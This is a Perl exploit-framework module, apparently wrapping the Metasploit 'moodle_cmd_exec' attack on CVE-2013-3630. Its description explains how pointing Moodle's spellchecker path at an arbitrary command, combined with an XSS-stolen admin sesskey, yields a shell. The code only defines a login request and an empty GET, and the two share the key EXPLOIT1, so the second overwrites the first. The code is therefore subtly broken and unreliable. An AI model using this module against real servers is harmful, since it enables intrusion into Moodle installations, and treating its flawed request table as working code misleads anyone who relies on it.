package MOODLE::MSF::MoodleCmdExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MoodleCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3630",
  DESCRIPTION => "

    Moodle allows an authenticated user to define spellcheck settings via the web interface.

    The user can update the spellcheck mechanism to point to a system-installed aspell binary.

    By updating the path for the spellchecker to an arbitrary command, an attacker can run

    arbitrary commands in the context of the web application upon spellchecking requests.



    This module also allows an attacker to leverage another privilege escalation vuln.

    Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey

    and use this to escalate privileges to that of an admin, allowing the module to pop a shell

    as a previously unprivileged authenticated user.



    This module was tested against Moodle version 2.5.2 and 2.2.3.

    ",
  MSF_MODULE => "moodle_cmd_exec",
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  TITLE => "Moodle Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'login/index.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /login/index.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
